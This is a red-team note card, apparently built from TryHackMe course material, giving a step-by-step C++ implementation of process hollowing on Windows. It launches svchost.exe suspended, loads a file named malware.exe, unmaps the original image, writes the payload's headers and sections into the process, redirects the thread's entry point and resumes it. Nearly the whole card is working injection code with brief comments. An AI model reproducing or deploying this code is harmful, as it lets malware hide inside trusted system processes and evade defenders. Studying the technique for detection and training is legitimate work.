---
{"dg-publish":true,"permalink":"/cards/red-team/process-hollowing-basic-example/","tags":["red-team/resource"]}
---

~ [[cards/red-team/Process Hollowing\|Process Hollowing]]

**Step 1:**

```cpp
LPSTARTUPINFOA target_si = new STARTUPINFOA(); // Defines station, desktop, handles, and appearance of a process
LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION(); // Information about the process and primary thread
CONTEXT c; // Context structure pointer

if (CreateProcessA(
	(LPSTR)"C:\\\\Windows\\\\System32\\\\svchost.exe", // Name of module to execute
	NULL,
	NULL,
	NULL,
	TRUE, // Handles are inherited from the calling process
	CREATE_SUSPENDED, // New process is suspended
	NULL,
	NULL,
	target_si, // pointer to startup info
	target_pi) == 0) { // pointer to process information
	cout << "[!] Failed to create Target process. Last Error: " << GetLastError();
	return 1;
}
```

**Step 2:**

```cpp
HANDLE hMaliciousCode = CreateFileA(
	(LPCSTR)"C:\\\\Users\\\\tryhackme\\\\malware.exe", // Name of image to obtain
	GENERIC_READ, // Read-only access
	FILE_SHARE_READ, // Read-only share mode
	NULL,
	OPEN_EXISTING, // Instructed to open a file or device if it exists
	NULL,
	NULL
);
```

Next one:

```cpp
DWORD maliciousFileSize = GetFileSize(
	hMaliciousCode, // Handle of malicious image
	0 // Returns no error
);

PVOID pMaliciousImage = VirtualAlloc(
	NULL,
	maliciousFileSize, // File size of malicious image
	0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
	0x04 // Enables read/write access (PAGE_READWRITE)
);
```

Next one:

```cpp
DWORD numberOfBytesRead; // Stores number of bytes read

if (!ReadFile(
	hMaliciousCode, // Handle of malicious image
	pMaliciousImage, // Allocated region of memory
	maliciousFileSize, // File size of malicious image
	&numberOfBytesRead, // Number of bytes read
	NULL
	)) {
	cout << "[!] Unable to read Malicious file into memory. Error: " <<GetLastError()<< endl;
	TerminateProcess(target_pi->hProcess, 0);
	return 1;
}

CloseHandle(hMaliciousCode);
```

**Step 3:**

```cpp
c.ContextFlags = CONTEXT_INTEGER; // Only stores CPU registers in the pointer
GetThreadContext(
	target_pi->hThread, // Handle to the thread obtained from the PROCESS_INFORMATION structure
	&c // Pointer to store retrieved context
); // Obtains the current thread context

PVOID pTargetImageBaseAddress; 
ReadProcessMemory(
	target_pi->hProcess, // Handle for the process obtained from the PROCESS_INFORMATION structure
	(PVOID)(c.Ebx + 8), // Pointer to the base address
	&pTargetImageBaseAddress, // Store target base address 
	sizeof(PVOID), // Bytes to read 
	0 // Number of bytes out
);
```

Next one:

```cpp
HMODULE hNtdllBase = GetModuleHandleA("ntdll.dll"); // Obtains the handle for ntdll
pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(
	hNtdllBase, // Handle of ntdll
	"ZwUnmapViewOfSection" // API call to obtain
); // Obtains ZwUnmapViewOfSection from ntdll

DWORD dwResult = pZwUnmapViewOfSection(
	target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
	pTargetImageBaseAddress // Base address of the process
);
```

**Step four:**

```cpp
PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage; // Obtains the DOS header from the malicious image
PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew); // Obtains the NT header from e_lfanew

DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage; // Obtains the size of the optional header from the NT header structure

PVOID pHollowAddress = VirtualAllocEx(
	target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
	pTargetImageBaseAddress, // Base address of the process
	sizeOfMaliciousImage, // Byte size obtained from optional header
	0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
	0x40 // Enabled execute and read/write access (PAGE_EXECUTE_READWRITE)
);
```

Next one:

```cpp
if (!WriteProcessMemory(
	target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
	pTargetImageBaseAddress, // Base address of the process
	pMaliciousImage, // Local memory where the malicious file resides
	pNTHeaders->OptionalHeader.SizeOfHeaders, // Byte size of PE headers 
	NULL
)) {
	cout<< "[!] Writting Headers failed. Error: " << GetLastError() << endl;
}
```

Next one:

```cpp
for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) { // Loop based on number of sections in PE data
	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER))); // Determines the current PE section header

	WriteProcessMemory(
		target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
		(PVOID)((LPBYTE)pHollowAddress + pSectionHeader->VirtualAddress), // Base address of current section 
		(PVOID)((LPBYTE)pMaliciousImage + pSectionHeader->PointerToRawData), // Pointer for content of current section
		pSectionHeader->SizeOfRawData, // Byte size of current section
		NULL
	);
}
```

**Step 5:**

```cpp
c.Eax = (SIZE_T)((LPBYTE)pHollowAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint); // Set the context structure pointer to the entry point from the PE optional header

SetThreadContext(
	target_pi->hThread, // Handle to the thread obtained from the PROCESS_INFORMATION structure
	&c // Pointer to the stored context structure
);
```

**Step 6**

```cpp
ResumeThread(
	target_pi->hThread // Handle to the thread obtained from the PROCESS_INFORMATION structure
);
```



